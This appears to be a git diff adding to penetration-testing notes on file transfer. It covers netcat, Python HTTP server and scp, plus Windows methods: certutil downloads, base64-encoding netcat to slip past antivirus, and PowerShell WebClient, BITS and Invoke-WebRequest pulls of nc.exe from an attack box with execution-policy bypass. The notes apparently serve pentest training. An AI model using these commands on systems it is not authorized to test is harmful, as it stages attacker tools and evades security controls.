@@ -16,6 +16,8 @@ nc [target box ip] 1234 < file-to-be-transfered.txt
 
 #### Python HTTP Server File Transfer
 - Start the Python Server in the directory where the file is located that you want to transfer
+- Use the ip address assigned to your box, if there is a vpn involved use the vpn address
+
 ```
 python3 -m http.server
 ```
@@ -51,3 +53,137 @@ scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
 ```
 scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh .
 ```
+### Windows Specific File Transfer
+#### CertUtil.exe
+- Windows has a built-in command line program called CertUtil.exe which is installed as part of Certificate Services and can be used to manage certificates in Windows.
+- CertUtil is also known as living off land LOL binary which is a trusted preinstalled system tool.
+- It can even bypass security features by base64 encoding the malware.
+````
+certutil -urlcache -split -f [url] [filename.extension]
+````
+- `-urlcache` Displays or deletes URL cache entries
+- `-f` Forces fetching a specific URL and updating the cache
+- `-split` Split embedded ASN.1 elements, and saves files on disk
+- Using the encoding may help bypass security controls in certutil.  
+- Using the `-decode` option we can download a Base-64 encoded malicious executable such as a text file and decode the executable to disk.  
+- This can bypass antivirus, edge devices and filtering.  
+- First we need to base64 encode the netcat executable.
+````
+certutil.exe -encode [inputfilename] [encoded output filename]
+````
+- To verify that the nc.txt file contains text, we can run the following command to print the first 10 lines to the terminal:
+````
+powershell -command “Get-Content nc.txt -Head 10”
+````
+- Now we have to transfer the text file to the target and decode it back to an executable.
+````
+certutil.exe -urlcache -split -f “http://[attack box ip]/nc.txt” nc.txt
+````
+- And the following command decodes the base64
+````
+certutil.exe -decode nc.txt nc.exe
+````
+#### Powershell downloads:System.Net.WebClient
+- First example uses .NET class System.Net.WebClient.
+- The following commands create a Powershell script on the remote Windows machine that can be used to download the file from the attack box:
+````
+echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
+echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
+````
+- Note that you have to insert the download link and filename in the command on the last line and replace all the bold with the URL and the filename.
+- Once verified that the PS script is created we can execute with:
+````
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
+````
+- Alternatively we can also execute the command from a regular command line in Windows powershell to download files without creating a script
+````
+powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"
+````
+- The -c option executes the command provided within the double quotes with Powershell.
+````
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
+````
+- The default execution policy is ‘Restricted’ which means the system will not run Powershell scripts.
+- With the following powershell command we can get the current execution policy:
+````
+Get-ExecutionPolicy
+````
+- We can now set the policy to ‘Unrestricted’:
+````
+Set-ExecutionPolicy Unrestricted
+````
+#### Powershell Downloads: Start-BitsTransfer
+- Another way to download files with Powershell is by using the Background Intelligent Transfer Service (BITS).
+- The Start-BitsTransfer cmdlet creates a BITS transfer job to transfer one or more files between a client computer and a server.
+- BITS has to be enabled on the target machine in order for it to work.
+- The following command will download nc.exe from a remote web server to the C drive:
+````
+powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[attack box ip]/nc.exe -Destination C:\
+````
+#### Powershell Downloads: Invoke-WebRequest
+- The Invoke-WebRequest cmdlet is simple and easy to use and is available in Powershell version 3.0 and higher.
+- Downloading large files with this method may cause memory issues.  
+- Recommended to use the System.Net.Web.Client method for transferring large files.
+````
+powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.exe
+````
+- For this cmdlet to work the target host needs to have at least Powershell 3.0
+- You can check the version of Powershell by using the following command 
+````
+powershell $PSVersionTable.PsVersion
+````
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
